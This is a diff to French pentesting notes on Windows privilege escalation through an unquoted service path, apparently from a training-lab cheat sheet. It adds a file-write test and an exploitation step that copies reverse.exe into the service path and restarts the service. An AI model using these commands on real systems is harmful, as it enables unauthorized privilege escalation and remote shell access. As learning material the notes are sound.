@@ -66,8 +66,13 @@ Exemple avec le path : `C:\Program Files\Unquoted Path Service\Common Files\unqu
 "C:\Program Files\Unquoted.exe"
 "C:\Program.exe"
 
-# tenter de créer un fichie
+# tenter de créer un fichier :
+echo "test" > "C:\Program Files\Unquoted Path Service\Common.exe"
+del "C:\Program Files\Unquoted Path Service\Common.exe"
+# si pas d'erreur alors c'est exploitable
+
 ```
+Remarque : On doit pouvoir le faire avec `icacls` ou `accesschk.exe` mais je n'ai pas pris le temps de creuser pour obtenir une méthode fiable.
 
 #### Automatique
 
@@ -85,6 +90,17 @@ C:\Program Files\Unquoted Path Service(Users [AllAccess])       <====
 [...]
 ```
 
+### Exploitation
+
+```shell
+copy reverse.exe "C:\Program Files\Unquoted Path Service\Common.exe"
+net stop unquotedsvc
+net start unquotedsvc
+```
+
+## Weak registry permissions
+
+#
 ## Trouver un service vulnérable (manuel)
 
 ### Lister les services
